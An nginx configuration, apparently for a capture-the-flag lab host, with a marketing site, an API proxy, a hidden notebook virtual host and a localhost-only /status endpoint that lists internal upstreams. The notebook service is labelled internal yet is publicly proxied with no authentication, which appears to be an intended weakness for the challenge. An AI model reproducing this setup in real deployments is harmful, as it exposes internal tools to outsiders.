map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
}
server {
    listen 80;
    server_name nb-1be3782a8afd3ad5.cohort.htb;
    return 301 https://nb-1be3782a8afd3ad5.cohort.htb$request_uri;   
}
server {
    listen 443 ssl;
    server_name nb-1be3782a8afd3ad5.cohort.htb;
    ssl_certificate     /etc/nginx/ssl/cohort.crt;
    ssl_certificate_key /etc/nginx/ssl/cohort.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    location / {
        proxy_pass http://127.0.0.1:8888;
        proxy_http_version 1.1;
        proxy_set_header Host              $host;
        proxy_set_header Upgrade           $http_upgrade;
        proxy_set_header Connection        $connection_upgrade;
        proxy_set_header X-Forwarded-For   $remote_addr;
        proxy_set_header X-Forwarded-Proto https;   
        proxy_read_timeout  3600s;
        proxy_send_timeout  3600s;
        proxy_buffering off;
    }
}
server {
    listen 80 default_server;
    server_name cohort.htb;
    return 301 https://cohort.htb$request_uri;
}
server {
    listen 443 ssl default_server;
    server_name cohort.htb;
    ssl_certificate     /etc/nginx/ssl/cohort.crt;
    ssl_certificate_key /etc/nginx/ssl/cohort.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    if ($host != cohort.htb) {
        return 301 https://cohort.htb$request_uri;
    }
    root /var/www/cohort;
    index index.html;
    location / {
        try_files $uri $uri/ /index.html;
    }
    location /api/ {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host              $host;
        proxy_set_header X-Forwarded-For   $remote_addr;
        proxy_set_header X-Forwarded-Proto https;
        proxy_read_timeout 15s;
    }
    location = /status {
        if ($remote_addr != "127.0.0.1") { return 403; }
        default_type application/json;
        return 200 '{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}';
    }
    location = /favicon.ico { access_log off; log_not_found off; }
}




